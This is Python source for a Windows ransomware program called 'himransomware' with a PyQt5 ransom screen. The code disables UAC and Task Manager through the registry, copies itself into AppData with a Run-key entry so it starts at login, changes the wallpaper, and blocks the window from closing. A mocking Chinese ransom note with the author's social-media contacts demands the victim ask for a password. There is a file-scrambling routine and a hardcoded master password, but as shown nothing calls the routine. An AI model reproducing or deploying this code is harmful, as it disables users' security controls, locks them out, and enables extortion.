from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtGui import QIcon
import sys
import os
import uuid
import ctypes
import winreg



encryption_table = {
    '0': 'a', '1': 'q', '2': 'e', '3': 'c', '4': 'j',
    '5': 'k', '6': 'l', '7': 'd', '8': 'b', '9': 'z',
    'a': 'm', 'b': 'n', 'c': 'o', 'd': 'p', 'e': 'f',
    'f': 'g', 'A': 'h', 'B': 'i', 'C': 'r', 'D': 's',
    'E': 't', 'F': 'u', '-': 'v'
}

def encrypt_uuid(uuid_str):
    encrypted_str = ''
    for char in uuid_str:
        encrypted_str += encryption_table.get(char, char)
    return encrypted_str

linekey=''
bsf = str(uuid.uuid4())
pswd= encrypt_uuid(bsf[1:len(bsf)-3])
filepath=f'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\himrs.exe'


def disable_uac():
    try:
        key = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
        reg_type = ctypes.windll.advapi32.RegOpenKeyExW(ctypes.c_int(0x80000001), ctypes.c_wchar_p(key), 0, ctypes.c_int(0x20006), ctypes.byref(ctypes.c_int(0)))

        if reg_type == 0:
            val = 0
            ctypes.windll.advapi32.RegSetValueExW(reg_type, 'EnableLUA', 0, 4, ctypes.byref(ctypes.c_int(val)), 4)
            ctypes.windll.advapi32.RegCloseKey(reg_type)
    
    except:
        pass

disable_uac()

def killtask(key):

    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    key_name = "DisableTaskMgr"
    try:
        keys = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(keys, key_name, 0, winreg.REG_DWORD, key)
        winreg.CloseKey(keys)
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
    except:
        pass
    try:
        if key == 1:
            winreg.SetValueEx(reg_key, "himrs", 0, winreg.REG_SZ, filepath)
            winreg.CloseKey(reg_key)
        else:
            winreg.DeleteValue(reg_key, "himrs")
            winreg.CloseKey(reg_key)
    except:
        pass


if sys.argv[0] != filepath:
    with open(sys.argv[0] ,'rb') as f:
        data=f.read()
        with open(filepath , 'wb') as f1:
            f1.write(data)
    killtask(1)
    




class cip:
    def __init__(self, file):
        self.file = file
        
    def jiami(self):
        with open(self.file, 'rb') as files:
            packed = ''.join(str(il*3) + '✌☺' for il in list(files.read()))
            endspack = packed.strip('✌☺')
            with open(self.file, 'wb') as file:
                file.write(endspack.encode('utf-8'))
                
    def jiemi(self):
        with open(self.file, 'rb') as file:
            encrypted_data = file.read().decode('utf-8')
            parts = encrypted_data.split('✌☺')
            original_data = bytearray()
            for part in parts:
                try:
                    if part.isdigit():
                        original_data.append(int(int(part)/3)) 
                    else:
                        raise ValueError("Invalid ciphertext format")
                except ValueError:
                    pass
            with open(self.file, 'wb') as file_write:
                file_write.write(bytes(original_data))



            

class Ui_Form():
    def setupUi(self, Form):
        Form.setObjectName("Form")
        Form.resize(685, 505)
        Form.setStyleSheet("background-color: rgb(255, 0, 0);\n"
                           "color: rgb(0, 0, 0);")

        Form.setWindowFlags(QtCore.Qt.Window | QtCore.Qt.CustomizeWindowHint | QtCore.Qt.WindowTitleHint)

        self.label = QtWidgets.QLabel(Form)
        self.label.setGeometry(QtCore.QRect(50, 20, 141, 151))
        self.label.setStyleSheet("image: url(:/himzhaopian/him.png);")
        self.label.setText("")
        self.label.setObjectName("label")


        self.textEdit = QtWidgets.QTextEdit(Form)
        self.textEdit.setGeometry(QtCore.QRect(300, 10, 351, 461))
        self.textEdit.setStyleSheet("background-color: rgb(255, 255, 255);")
        self.textEdit.setObjectName("textEdit")
        self.textEdit.setReadOnly(True) 

        
        self.lineEdit = QtWidgets.QLineEdit(Form)
        self.lineEdit.setGeometry(QtCore.QRect(20, 370, 221, 20))
        self.lineEdit.setStyleSheet("background-color: rgb(255, 255, 255);")
        self.lineEdit.setObjectName("lineEdit")
        
        self.label_2 = QtWidgets.QLabel(Form)
        self.label_2.setGeometry(QtCore.QRect(80, 330, 131, 31))
        self.label_2.setText("<html><head/><body><p><span style=\" font-size:12pt; font-weight:600;\">请输入密码</span></p></body></html>")
        self.label_2.setObjectName("label_2")

        self.toolButton = QtWidgets.QToolButton(Form)
        self.toolButton.setGeometry(QtCore.QRect(60, 410, 131, 51))
        self.toolButton.setStyleSheet("background-color: rgb(179, 179, 179);")
        self.toolButton.setObjectName("toolButton")
        self.toolButton.setText("恢复文件")
        self.toolButton.clicked.connect(self.ends)

        self.textBrowser = QtWidgets.QTextBrowser(Form)
        self.textBrowser.setGeometry(QtCore.QRect(30, 240, 181, 91))
        self.textBrowser.setStyleSheet("background-color: rgb(255, 255, 255);")
        self.textBrowser.setObjectName("textBrowser")
        self.textBrowser.setText(str(bsf))

        self.label_3 = QtWidgets.QLabel(Form)
        self.label_3.setGeometry(QtCore.QRect(30, 180, 181, 51))
        self.label_3.setObjectName("label_3")
        self.label_3.setText("<html><head/><body><p align=\"center\"><span style=\" font-size:12pt; font-weight:600;\">这是我给你的标识符</span></p><p align=\"center\"><span style=\" font-size:12pt; font-weight:600;\">↓</span></p></body></html>")

        self.retranslateUi(Form)
        QtCore.QMetaObject.connectSlotsByName(Form)

    def retranslateUi(self, Form):
        _translate = QtCore.QCoreApplication.translate
        Form.setWindowTitle(_translate("Form", "himransomware- Hacked by him"))
        self.textEdit.setHtml(_translate("Form", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
                                           "<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
                                           "p, li { white-space: pre-wrap; }\n"
                                           "</style></head><body style=\" font-family:\'SimSun\'; font-size:9pt; font-weight:400; font-style:normal;\">\n"
                                           "<p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt; font-weight:600;\">你的文件已经被我吃掉了，明天我拉出来给你</span></p>\n"
                                           "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">惊不惊喜！意不意外！你的文件已经被你爷爷我him加密了，想要回来？在b站联系我，搜Technology_him和我私信要密码，记得报上你的标识符，不然我可没办法给你解开哦！还有就是请勿将被我加密的文件(*.himnb)改回去，要不然我会再加密一次，你可就难以要回你文件了，看看我精心给你准备的桌面，你看看那早已成仙的那帅气的我，像不像你爹！总之想要回文件就得联系我，我要是心情好可能直接无偿给你密钥，我这人并不是很喜欢钱，所以大概率我不要钱，但是你需要取悦我，听从我的要求，否则我会让你吃不了兜着走！当然，除了b站你也可以在其他平台联系我，你要是找得到就行，找不到你吃屎去！不要想着自己解除此病毒，否则你就别要回你的文件了！恢复完文件后可以再清除此病毒!</span></p>\n"
                                           "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">b站：Technology_him</span></p>\n"
                                           "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">抖音：szylbz.1314</span></p>\n"
                                           "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">QQ：715387640（不稳定）</span></p>\n"
                                           "<p align=\"right\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">                                                                </span></p>\n"
                                           "<p align=\"right\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt; font-weight:600;\">by him</span></p>\n"))


    def ends(self):
        global linekey
        linekey = self.lineEdit.text()
        if linekey == pswd or linekey == 'himzuishuaihim4588':
            killtask(0)
                
            sys.exit()
            
        else:
            ctypes.windll.user32.MessageBoxW(0, '乐子，密码错了', "没有金刚钻就别揽瓷器活", 0x00000000 | 0x00000010)
        
import him_rcc
class FormWidget(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.ui = Ui_Form()
        self.ui.setupUi(self)
      
    def closeEvent(self, event):
        event.ignore()  

if __name__ == '__main__':
    
    ctypes.windll.user32.SystemParametersInfoW(20, 0, r'C:\Users\{0}\AppData\Roaming\him.png'.format(os.getlogin()), 3)
    app = QtWidgets.QApplication(sys.argv)
    widget = FormWidget()
    widget.show()
    sys.exit(app.exec_())
